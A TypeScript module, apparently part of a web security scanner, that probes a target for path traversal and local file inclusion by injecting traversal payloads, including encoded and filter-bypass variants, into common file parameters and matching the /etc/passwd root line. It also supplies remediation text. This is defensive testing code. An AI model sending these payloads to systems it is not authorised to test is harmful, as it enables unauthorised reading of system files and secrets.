// Path Traversal / Local File Inclusion active probe (AGGRESSIVE tier). Injects
// a traversal sequence into common file-y parameters and looks for the signature
// of a real system file (/etc/passwd's "root:...:0:0:" line, or a Windows
// boot.ini/win.ini marker). Non-destructive: it only READS a well-known file.
import { buildProbeEvidence } from "../evidence.js";
import { probeFetch } from "../redTeam/probeHttp.js";
import type { ProbeContext, RedTeamFinding } from "../redTeam/types.js";

// Parameters most likely to be used as a file path by the application.
const FILE_PARAMS = ["file", "path", "page", "template", "doc", "download", "filename"];

// Traversal payloads: plain, over-deep, and a couple of common filter bypasses.
const PAYLOADS = [
  "../../../../../../../../etc/passwd",
  "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
  "....//....//....//....//....//....//etc/passwd",
  "/etc/passwd",
];

// A real /etc/passwd row: name:x:uid:gid:… — "root:...:0:0:" is unmistakable.
const PASSWD_SIGNATURE = /root:[^:\n]*:0:0:/;

export async function probePathTraversal(ctx: ProbeContext): Promise<RedTeamFinding | null> {
  for (const param of FILE_PARAMS) {
    for (const payload of PAYLOADS) {
      const attackUrl = `${ctx.url}/?${param}=${payload}`;
      let res: Response;
      let body: string;
      try {
        res = await probeFetch(attackUrl, ctx.fuzzHeaders);
        body = await res.text();
      } catch {
        continue;
      }
      const match = PASSWD_SIGNATURE.exec(body);
      if (match) {
        return {
          testName: "Active Path Traversal / Local File Inclusion",
          payload: `${param}=${payload}`,
          severity: "critical",
          description:
            "Active Red Team fuzzing retrieved the contents of a system file (/etc/passwd) by injecting a directory-traversal sequence into a request parameter, confirming Path Traversal / Local File Inclusion. An attacker can read arbitrary files (source, secrets, credentials) the app process can access.",
          fix: "Never build filesystem paths from user input. Resolve the requested path and verify it stays within an allowed base directory (canonicalize then check the prefix), or map inputs to an allow-list of known files; reject any input containing path separators or traversal sequences.",
          evidence: buildProbeEvidence({
            method: "error-signature",
            attackUrl,
            requestHeaders: ctx.fuzzHeaders,
            res,
            body,
            matchIndex: match.index,
            quote: match[0],
            why: `This is the "root" account line from /etc/passwd — a file outside the web root that a normal response never contains. It was returned only because our traversal payload in the "${param}" parameter reached the filesystem.`,
            demonstration: `We asked for "${payload}" via the "${param}" parameter and the server returned the contents of /etc/passwd (including "${match[0]}"). That file is not part of the site — the app read an arbitrary path we supplied, proving Local File Inclusion.`,
          }),
        };
      }
    }
  }
  return null;
}
